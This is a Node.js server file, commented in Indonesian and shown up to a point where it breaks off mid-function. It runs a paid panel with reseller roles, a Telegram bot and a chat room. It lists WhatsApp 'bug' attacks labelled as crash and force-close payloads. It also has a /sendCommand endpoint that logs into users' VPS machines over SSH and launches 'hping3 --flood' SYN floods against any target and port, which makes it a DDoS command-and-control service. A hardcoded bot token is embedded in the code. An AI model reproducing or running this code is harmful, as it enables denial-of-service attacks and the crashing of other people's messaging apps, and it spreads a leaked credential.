const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);

process.on('unhandledRejection', (reason) => console.log('Unhandled Rejection:', reason));
process.on('uncaughtException', (err) => console.log('Uncaught Exception:', err));

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') || chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') || chunk.includes('Session error') ||
    chunk.includes('Closing open session') || chunk.includes('Removing old closed')
  )) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};
process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') || chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') || chunk.includes('Session error:') ||
    chunk.includes('Closing open session') || chunk.includes('Removing old closed')
  )) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const {
  default: makeWASocket, useMultiFileAuthState, downloadContentFromMessage,
  emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent,
  generateWAMessage, makeInMemoryStore, prepareWAMessageMedia,
  generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus,
  downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata,
  initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions,
  useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions,
  WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto,
  WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata,
  ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage,
  WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent,
  WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo,
  URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, jidDecode,
  mentionedJid, processTime, Browser, MessageType, makeChatsSocket,
  generateProfilePicture, Presence, WA_MESSAGE_STUB_TYPES, Mimetype,
  relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket,
  encodeWAMessage, getStream, WAProto, isBaileys, AnyMessageContent,
  fetchLatestWaWebVersion, templateMessage, fetchLatestBaileysVersion,
  InteractiveMessage, Header, viewOnceMessage, groupStatusMentionMessage,
} = require('whiskeysockets/baileys');
const express = require("express");
const bodyParser = require('body-parser');
const readline = require("readline");
const crypto = require("crypto");
const cors = require('cors');
const app = express();
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const fsPromises = require('fs').promises;
const path = require('path');
const pino = require('pino');
const P = require('pino')
const axios = require('axios')
const vm = require('vm')
const os = require('os');
const WebSocket = require('ws');
const http = require('http');
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
let wsClients = {};
let chatList = [];
const CHAT_FILE = 'chat.json';
const { Client } = require('ssh2');
const DB_PATH = "./database.json";
const SESSION_PATH = path.join(__dirname, "permenmd");
const THIRTY_MINUTES = 30 * 60 * 1000;
const qrCodes = {};
let activeKeys = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');

// ============================================================
// 🔥 ROLE SYSTEM BARU - HIERARCHY TURUN TEMURUN
// ============================================================

// Role Hierarchy (Tertinggi ke Terendah)
const ROLE_HIERARCHY = [
  'developers',    // Level 10 - Tertinggi
  'ceo',           // Level 9
  'owner',         // Level 8
  'admin',         // Level 7
  'tangan_kanan',  // Level 6
  'vip',           // Level 5
  'reseller',      // Level 4
  'full_up',       // Level 3
  'member_perbulan', // Level 2
  'member_perminggu', // Level 2
  'member_perhari' // Level 1 - Terendah
];

// Level untuk perbandingan
const ROLE_LEVEL = {
  'developers': 10,
  'ceo': 9,
  'owner': 8,
  'admin': 7,
  'tangan_kanan': 6,
  'vip': 5,
  'reseller': 4,
  'full_up': 3,
  'member_perbulan': 2,
  'member_perminggu': 2,
  'member_perhari': 1
};

// Role yang bisa mengakses sender GLOBAL
const GLOBAL_SENDER_ROLES = [
  'developers',
  'ceo', 
  'owner', 
  'admin', 
  'tangan_kanan', 
  'vip'
];

// Role yang bisa membuat akun lain (CREATE) - TURUN TEMURUN
const CAN_CREATE_ROLES = {
  'developers': ['developers', 'ceo', 'owner', 'admin', 'tangan_kanan', 'vip', 'reseller', 'full_up', 'member_perbulan', 'member_perminggu', 'member_perhari'],
  'ceo': ['owner', 'admin', 'tangan_kanan', 'vip', 'reseller', 'full_up', 'member_perbulan', 'member_perminggu', 'member_perhari'],
  'owner': ['admin', 'tangan_kanan', 'vip', 'reseller', 'full_up', 'member_perbulan', 'member_perminggu', 'member_perhari'],
  'admin': ['tangan_kanan', 'vip', 'reseller', 'full_up', 'member_perbulan', 'member_perminggu', 'member_perhari'],
  'tangan_kanan': ['vip', 'reseller', 'full_up', 'member_perbulan', 'member_perminggu', 'member_perhari'],
  'vip': [], // VIP tidak bisa create
  'reseller': ['full_up', 'member_perbulan', 'member_perminggu', 'member_perhari'],
  'full_up': [],
  'member_perbulan': [],
  'member_perminggu': [],
  'member_perhari': []
};

// Cooldown berdasarkan role (dalam detik)
const ROLE_COOLDOWNS = {
  'developers': 1,
  'ceo': 1,
  'owner': 2,
  'admin': 5,
  'tangan_kanan': 10,
  'vip': 15,
  'reseller': 60,
  'full_up': 120,
  'member_perbulan': 180,
  'member_perminggu': 240,
  'member_perhari': 300
};

// ============================================================
// 🔥 FUNGSI HELPER ROLE
// ============================================================

// Cek apakah role punya akses sender global
function canAccessGlobalSender(role) {
  return GLOBAL_SENDER_ROLES.includes(role);
}

// Dapatkan level role
function getRoleLevel(role) {
  return ROLE_LEVEL[role] || 0;
}

// Cek apakah role A bisa membuat role B (TURUN TEMURUN)
function canCreateRole(creatorRole, targetRole) {
  const allowed = CAN_CREATE_ROLES[creatorRole] || [];
  return allowed.includes(targetRole);
}

// Validasi role valid
function isValidRole(role) {
  return ROLE_LEVEL.hasOwnProperty(role);
}

// Dapatkan cooldown berdasarkan role
function getCooldown(role) {
  return ROLE_COOLDOWNS[role] || 120;
}

// Dapatkan display name role
function getRoleDisplay(role) {
  switch (role.toLowerCase()) {
    case 'developers': return 'DEVELOPERS';
    case 'ceo': return 'CEO';
    case 'owner': return 'OWNER';
    case 'admin': return 'ADMIN';
    case 'tangan_kanan': return 'TANGAN KANAN';
    case 'vip': return 'VIP';
    case 'reseller': return 'RESELLER';
    case 'full_up': return 'FULL UP';
    case 'member_perbulan': return 'MEMBER BULANAN';
    case 'member_perminggu': return 'MEMBER MINGGUAN';
    case 'member_perhari': return 'MEMBER HARIAN';
    default: return role.toUpperCase();
  }
}

// Dapatkan warna role (hex)
function getRoleColorHex(role) {
  switch (role.toLowerCase()) {
    case 'developers': return '#FF00FF';
    case 'ceo': return '#FFD700';
    case 'owner': return '#FF1744';
    case 'admin': return '#F59E0B';
    case 'tangan_kanan': return '#8B5CF6';
    case 'vip': return '#EC4899';
    case 'reseller': return '#22C55E';
    case 'full_up': return '#10B981';
    case 'member_perbulan': return '#3B82F6';
    case 'member_perminggu': return '#F97316';
    case 'member_perhari': return '#6B7280';
    default: return '#FFFFFF';
  }
}

// Dapatkan durasi role
function getRoleDuration(role) {
  switch (role.toLowerCase()) {
    case 'developers': return 'Permanen';
    case 'ceo': return 'Permanen';
    case 'owner': return 'Permanen';
    case 'admin': return 'Permanen';
    case 'tangan_kanan': return 'Permanen';
    case 'vip': return 'Permanen';
    case 'reseller': return 'Permanen';
    case 'full_up': return 'Permanen';
    case 'member_perbulan': return '30 Hari';
    case 'member_perminggu': return '7 Hari';
    case 'member_perhari': return '1 Hari';
    default: return '-';
  }
}

// ============================================================
// 🔥 BUG LIST
// ============================================================

const bugs = [
  { bug_id: "xfcui", bug_name: "CRASH UI" },
  { bug_id: "fcc", bug_name: "FORCE CLOSE VNX" },
  { bug_id: "fc", bug_name: "DELAY HARD" },
  { bug_id: "androidfrz", bug_name: "CRASH HOME" },
  { bug_id: "clickcrash", bug_name: "BULDOZER"},
  { bug_id: "delay", bug_name: "FORCLOSE"},
  { bug_id: "iosXv", bug_name: "FC X BLANK"},
  { bug_id: "resmension", bug_name: "FC NO CLICK"},
  { bug_id: "forceclosenoci", bug_name: "FC ANDROID"},
  { bug_id: "ios", bug_name: "FC INVIS"},
  { bug_id: "blank", bug_name: "BLANK NO CLICK"},
  { bug_id: "blankv2", bug_name: "BLANK HARD"},
];

let cncActive = true;
let vpsList = [];
let vpsConnections = {}
const VPS_FILE = 'vps.json';
let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
fs.watchFile("keyList.json", () => {
  console.log("[keyList.json changed, reloading...]");
  sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
});

if (fs.existsSync(CHAT_FILE)) {
  chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
}

function saveChat() {
  fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
}

function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '')
    .replace(/[\r\n]/g, ' ')
    .slice(0, 250);
}

// ⚠️ GANTI TOKEN DI BAWAH INI DENGAN TOKEN VALID DARI BOTFATHER
const TOKEN = "8830693885:AAH-sffG7cYWsjKO5Nbh28VK6_ZbZURVAEg"; 
// ⚠️ GANTI ID DI BAWAH DENGAN ID TELEGRAM KAMU
const OWNER_ID = 8433907538; 

// ===== TAMBAHKAN VARIABEL UNTUK DEVELOPER =====
const DEV_FILE = path.join(__dirname, 'devs.json');

const bot = new TelegramBot(TOKEN, { polling: true });

async function appendLogAsync(filePath, data) {
  try {
    if (fs.existsSync(filePath)) {
      const stats = fs.statSync(filePath);
      if (stats.size > 5 * 1024 * 1024) {
        fs.writeFileSync(filePath, '');
      }
    }
    await fsPromises.appendFile(filePath, data);
  } catch (err) {
    console.error(`[LOG ERROR] Gagal menulis log: ${err.message}`);
  }
}

async function autoRefresh() {
  try {
    if (!fs.existsSync(SESSION_PATH)) {
      console.log("Folder 'permenmd' tidak ditemukan.");
    } else {
      let deletedCount = 0;
      const userFolders = fs.readdirSync(SESSION_PATH);

      for (const userFolder of userFolders) {
        const userPath = path.join(SESSION_PATH, userFolder);
        if (!fs.lstatSync(userPath).isDirectory()) continue;

        const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
        if (!hasJson) {
          fs.rmSync(userPath, { recursive: true, force: true });
          deletedCount++;
        }
      }
      console.log(`[AUTO REFRESH] ${deletedCount} folder session kosong dihapus.`);
    }

    console.log("[AUTO REFRESH] Auto restart dijalankan...");

    setTimeout(() => {
      console.log("[AUTO REFRESH] Server aktif dan berjalan normal setelah auto restart.");
    }, 8000);

    setTimeout(() => {
      console.log("[AUTO REFRESH] Process restart server");
      process.exit(0);
    }, 5000);

  } catch (err) {
    console.error("[AUTO REFRESH] Error", err);
  }
}

const LOGS_DIR = path.join(__dirname, 'user_logs');

function hapusIsiUserLogs() {
  if (!fs.existsSync(LOGS_DIR)) {
    console.log("[AUTOCLEAN LOGS] Folder tidak ditemukan");
    return;
  }

  const files = fs.readdirSync(LOGS_DIR);

  for (const file of files) {
    const filePath = path.join(LOGS_DIR, file);
    fs.rmSync(filePath, { recursive: true, force: true });
  }

  console.log("[AUTOCLEAN LOGS] Isi folder berhasil dihapus");
}

if (!fs.existsSync(LOGS_DIR)) {
  fs.mkdirSync(LOGS_DIR, { recursive: true });
  console.log("[LOGS] Folder 'user_logs' dibuat.");
}

function saveUserLog(username, type, title, description) {
  try {
    const userLogPath = path.join(LOGS_DIR, `${username}.json`);
    let logs = [];

    if (fs.existsSync(userLogPath)) {
      logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));
    }

    logs.push({
      type: type,
      title: title,
      description: description,
      timestamp: Date.now()
    });

    fs.writeFileSync(userLogPath, JSON.stringify(logs, null, 2));
    console.log(`[LOGS] Activity saved for ${username}: ${type}`);
  } catch (err) {
    console.error(`[LOGS] Gagal simpan log ${username}:`, err.message);
  }
}

const onlineUsers = new Set();
const activeConnections = {};
const biz = {};
const mess = {};
const sessions = {};
let devices = {};
const cameraFrames = {};

function generateRandomMessageId() {
    return crypto.randomBytes(16).toString('hex');
}

async function waUploadToServer(buffer) {
    return { url: "https://example.com/uploaded", buffer };
}

wss.on('connection', function (ws, req) {
  let username;

  function broadcastStats() {
    const stats = JSON.stringify({
      type: 'stats',
      onlineUsers: onlineUsers.size,
      activeConnections: wss.clients.size,
    });
    wss.clients.forEach((client) => {
      if (client.readyState === 1) {
        client.send(stats);
      }
    });
  }

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

      if (data.type === 'stats') {
        broadcastStats();
      }

      if (data.type === 'sessionCheck') {
        const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const user = sessionList.find(e => e.sessionKey === data.key);

        if (!user) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Invalid key"
          }));
          return ws.close();
        }

        if (user.androidId !== data.androidId) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Another device has logged in"
          }));
          return ws.close();
        }
      }

      if (data.type === 'validate') {
        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key);
        const validId = session.find(e => e.androidId === data.androidId);

        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

        const userInfo = session.find(e => e.sessionKey === data.key);
        ws.username = userInfo?.username || data.key;
        onlineUsers.add(ws.username);
        broadcastStats();

        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: userInfo?.username,
          androidId: userInfo?.androidId,
          role: userInfo?.role || "member_perhari"
        }));

        const interval = setInterval(() => {
          const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
          const validKey = session.find(e => e.sessionKey === data.key);
          const validId = session.find(e => e.androidId === data.androidId);

          if (!validKey) {
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "keyInvalid"
            }));
            clearInterval(interval);
            return ws.close();
          }

          if (!validId) {
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "androidIdMismatch"
            }));
            clearInterval(interval);
            return ws.close();
          }

        }, 10000);

        ws.interval = interval;
      }

      if (data.type === 'auth') {
        username = getUserByKey(data.key);
        console.log(username);
        if (!username) return ws.close();
        wsClients[username] = ws;

        const list = chatList
          .filter(m => m.from === username || m.to === username)
          .map(m => (m.from === username ? m.to : m.from));

        ws.send(JSON.stringify({
          type: "chatList",
          users: [...new Set(list)],
        }));
      }

      if (data.type === 'chat') {
        const to = data.to;
        const message = sanitize(data.message);
        if (!username || !to || !message || message.length > 250) return;

        const chat = {
          from: username,
          to,
          message,
          time: new Date().toISOString()
        };
        chatList.push(chat);
        saveChat();

        ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));

        if (wsClients[to]) {
          wsClients[to].send(JSON.stringify({
            type: 'chat',
            message: { ...chat, fromMe: false }
          }));
        }
      }

      if (data.type === 'getMessages') {
        const withUser = data.with;
        const messages = chatList
          .filter(m =>
            (m.from === username && m.to === withUser) ||
            (m.from === withUser && m.to === username)
          )
          .map(m => ({
            ...m,
            fromMe: m.from === username
          }));

        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
      }

    } catch (e) {
      console.error("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    if (ws.username) {
      onlineUsers.delete(ws.username);
      broadcastStats();
    }
    if (ws.interval) clearInterval(ws.interval);
    if (username && wsClients[username]) {
      delete wsClients[username];
    }
  });
});

app.use(express.urlencoded({ extended: false }));
app.use(express.json());

const rateLimitMap = {};
function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 2) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    console.warn(`[RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);

    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData);

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000;

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }

    console.log("activeKeys loaded from keyList.json.");
  } catch (err) {
    console.error("Failed to load keyList.json:", err.message);
  }
}

function connectToAllVPS() {
  if (!cncActive) return;

  console.log("Connecting to all VPS servers...");

  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(`Already connected to ${vps.host}`);
      continue;
    }

    const conn = new Client();

    conn.on('ready', () => {
      if (!cncActive) {
        conn.end();
        return;
      }

      console.log(`Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      conn.on('close', () => {
        console.log(`Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];

        if (cncActive) {
          console.log(`Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    conn.on('error', (err) => {
      console.log(`Failed to connect to ${vps.host}: ${err.message}`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

function disconnectAllVPS() {
  console.log("Disconnecting all VPS connections...");
  cncActive = false;

  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

if (fs.existsSync(VPS_FILE)) {
  vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
  console.log("VPS list loaded.");
  connectToAllVPS();
}

fs.watch(VPS_FILE, () => {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("VPS list updated.");
    connectToAllVPS();
  } catch (e) {
    console.error("Failed to update VPS list:", e.message);
  }
});

function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  if (!keyInfo) return null;
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  return user ? keyInfo.username : null;
}

app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json(userVPS);
});

app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) {
      console.log(`Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        console.log(`Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});

function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
    console.log("[DB] Database baru dibuat.");
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  console.log("[GEN] Key baru dibuat:", key);
  return key;
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  console.log(`[EXP] ${user.username} expired:`, expired);
  return expired;
}

// ========== CHAT ENDPOINTS ==========
app.get("/api/chat/messages", (req, res) => {
  const { session_key } = req.query;
  
  const keyInfo = activeKeys[session_key];
  if (!keyInfo) {
    return res.status(401).json({ valid: false, message: "Invalid session key" });
  }
  
  const username = keyInfo.username;
  
  const userMessages = chatList.filter(m => 
    m.from === username || m.to === username
  );
  
  res.json(userMessages);
});

app.post("/api/chat/send", (req, res) => {
  const { session_key, username, role, message } = req.body;
  
  const keyInfo = activeKeys[session_key];
  if (!keyInfo) {
    return res.status(401).json({ valid: false, message: "Invalid session" });
  }
  
  if (keyInfo.username !== username) {
    return res.status(401).json({ valid: false, message: "Username mismatch" });
  }
  
  if (!message || message.trim() === "") {
    return res.status(400).json({ valid: false, message: "Message cannot be empty" });
  }
  
  const chat = {
    from: username,
    to: "public",
    message: sanitize(message),
    role: role,
    time: new Date().toISOString(),
    created_at: new Date().toISOString()
  };
  
  chatList.push(chat);
  saveChat();
  
  for (const ws of Object.values(wsClients)) {
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({
        type: 'new_message',
        message: chat
      }));
    }
  }
  
  res.json({ valid: true, status: "sent", message: chat });
});

// ========== CHAT ROOM ENDPOINTS ==========
app.get("/chatroom", (req, res) => {
  try {
    const publicMessages = chatList.filter(m => m.to === "public" || m.to === "public_chat");
    const formattedMessages = publicMessages.map(m => ({
      from: m.from,
      message: m.message,
      time: new Date(m.time).getTime(),
      status: "diterima"
    }));
    res.json(formattedMessages);
  } catch (err) {
    console.error("[CHATROOM] Error get messages:", err);
    res.status(500).json({ error: "Failed to get messages" });
  }
});

app.post("/chatroom", (req, res) => {
  try {
    const { from, message } = req.body;
    
    if (!from || !message || message.trim() === "") {
      return res.status(400).json({ 
        valid: false, 
        message: "From and message are required" 
      });
    }
    
    const db = loadDatabase();
    const user = db.find(u => u.username === from);
    if (!user) {
      return res.status(401).json({ 
        valid: false, 
        message: "User not found" 
      });
    }
    
    if (isExpired(user)) {
      return res.status(403).json({ 
        valid: false, 
        message: "Account expired" 
      });
    }
    
    const chat = {
      from: from,
      to: "public",
      message: sanitize(message),
      role: user.role || "member_perhari",
      time: new Date().toISOString(),
      created_at: new Date().toISOString()
    };
    
    chatList.push(chat);
    saveChat();
    
    for (const ws of Object.values(wsClients)) {
      if (ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({
          type: 'new_message',
          message: chat
        }));
      }
    }
    
    res.status(200).json({ 
      valid: true, 
      status: "sent", 
      message: chat 
    });
    
  } catch (err) {
    console.error("[CHATROOM] Error send message:", err);
    res.status(500).json({ 
      valid: false, 
      error: "Failed to send message" 
    });
  }
});

app.get("/chatroom/history", (req, res) => {
  try {
    const { limit = 50, offset = 0 } = req.query;
    
    const publicMessages = chatList
      .filter(m => m.to === "public" || m.to === "public_chat")
      .sort((a, b) => new Date(a.time) - new Date(b.time));
    
    const total = publicMessages.length;
    const sliced = publicMessages.slice(
      parseInt(offset), 
      parseInt(offset) + parseInt(limit)
    );
    
    const formatted = sliced.map(m => ({
      from: m.from,
      message: m.message,
      time: new Date(m.time).getTime(),
      status: "diterima"
    }));
    
    res.json({
      valid: true,
      messages: formatted,
      total: total,
      limit: parseInt(limit),
      offset: parseInt(offset)
    });
    
  } catch (err) {
    console.error("[CHATROOM] Error get history:", err);
    res.status(500).json({ error: "Failed to get history" });
  }
});

app.delete("/chatroom/clear", (req, res) => {
  const { key } = req.query;
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.status(401).json({ valid: false, message: "Invalid session key" });
  }
  
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user || user.role !== "developers") {
    return res.status(403).json({ 
      valid: false, 
      message: "Only Developers can clear chat room" 
    });
  }
  
  chatList = chatList.filter(m => m.to !== "public" && m.to !== "public_chat");
  saveChat();
  
  res.json({ 
    valid: true, 
    message: "Chat room cleared successfully" 
  });
});

// ========== NOTIFICATION ENDPOINTS ==========
const NOTIFICATION_FILE = path.join(__dirname, 'notifications.json');

if (!fs.existsSync(NOTIFICATION_FILE)) {
  fs.writeFileSync(NOTIFICATION_FILE, JSON.stringify({ notifications: [] }, null, 2));
  console.log("[NOTIF] File notifications.json dibuat.");
}

function readNotifications() {
  try {
    const data = fs.readFileSync(NOTIFICATION_FILE, 'utf8');
    return JSON.parse(data);
  } catch (err) {
    console.error("[NOTIF] Gagal baca file:", err.message);
    return { notifications: [] };
  }
}

function saveNotifications(data) {
  try {
    fs.writeFileSync(NOTIFICATION_FILE, JSON.stringify(data, null, 2));
  } catch (err) {
    console.error("[NOTIF] Gagal simpan file:", err.message);
  }
}

app.get("/notify/list", (req, res) => {
  try {
    const data = readNotifications();
    res.json({
      valid: true,
      notifications: data.notifications || []
    });
  } catch (err) {
    console.error("[NOTIF] Error get list:", err);
    res.status(500).json({ 
      valid: false, 
      error: "Failed to get notifications" 
    });
  }
});

app.post("/notify/send", (req, res) => {
  try {
    const { key, title, message, type, target } = req.body;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
      return res.status(401).json({ 
        valid: false, 
        message: "Invalid session key" 
      });
    }
    
    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    
    // Role yang bisa mengirim notifikasi
    const allowedRoles = ['developers', 'ceo', 'owner', 'admin', 'tangan_kanan', 'vip'];
    if (!user || !allowedRoles.includes(user.role)) {
      return res.status(403).json({ 
        valid: false, 
        message: "Anda tidak memiliki izin untuk mengirim notifikasi" 
      });
    }
    
    if (!title || !message) {
      return res.status(400).json({ 
        valid: false, 
        message: "Title dan message wajib diisi" 
      });
    }
    
    const data = readNotifications();
    const newNotif = {
      id: Date.now().toString(),
      title: title,
      message: message,
      type: type || "info",
      target: target || "all",
      createdAt: new Date().toISOString(),
      read: false,
      sender: user.username
    };
    
    data.notifications.unshift(newNotif);
    
    if (data.notifications.length > 100) {
      data.notifications = data.notifications.slice(0, 100);
    }
    
    saveNotifications(data);
    
    for (const ws of Object.values(wsClients)) {
      if (ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({
          type: 'new_notification',
          notification: newNotif
        }));
      }
    }
    
    saveUserLog(
      user.username,
      "notify",
      "Kirim Notifikasi",
      `Title: ${title} | Target: ${target || 'all'}`
    );
    
    res.json({ 
      valid: true, 
      message: "Notifikasi berhasil dikirim",
      notification: newNotif 
    });
    
  } catch (err) {
    console.error("[NOTIF] Error send:", err);
    res.status(500).json({ 
      valid: false, 
      error: "Gagal mengirim notifikasi" 
    });
  }
});

app.post("/notify/add", (req, res) => {
  try {
    const { title, message, type, target } = req.body;
    
    if (!title || !message) {
      return res.status(400).json({ 
        valid: false, 
        error: "Title and message are required" 
      });
    }
    
    const data = readNotifications();
    const newNotif = {
      id: Date.now().toString(),
      title: title,
      message: message,
      type: type || "info",
      target: target || "all",
      createdAt: new Date().toISOString(),
      read: false
    };
    
    data.notifications.unshift(newNotif);
    
    if (data.notifications.length > 100) {
      data.notifications = data.notifications.slice(0, 100);
    }
    
    saveNotifications(data);
    
    res.json({
      valid: true,
      notification: newNotif
    });
    
  } catch (err) {
    console.error("[NOTIF] Error add:", err);
    res.status(500).json({ 
      valid: false, 
      error: "Failed to add notification" 
    });
  }
});

app.post("/notify/read/:id", (req, res) => {
  try {
    const { id } = req.params;
    const data = readNotifications();
    
    const notif = data.notifications.find(n => n.id === id);
    if (notif) {
      notif.read = true;
      saveNotifications(data);
    }
    
    res.json({ valid: true });
  } catch (err) {
    console.error("[NOTIF] Error read:", err);
    res.status(500).json({ valid: false, error: "Failed to mark as read" });
  }
});

app.delete("/notify/delete/:id", (req, res) => {
  try {
    const { id } = req.params;
    const data = readNotifications();
    
    data.notifications = data.notifications.filter(n => n.id !== id);
    saveNotifications(data);
    
    res.json({ valid: true });
  } catch (err) {
    console.error("[NOTIF] Error delete:", err);
    res.status(500).json({ valid: false, error: "Failed to delete notification" });
  }
});

app.delete("/notify/clear", (req, res) => {
  try {
    const data = readNotifications();
    data.notifications = [];
    saveNotifications(data);
    
    res.json({ valid: true, message: "All notifications cleared" });
  } catch (err) {
    console.error("[NOTIF] Error clear:", err);
    res.status(500).json({ valid: false, error: "Failed to clear notifications" });
  }
});

app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
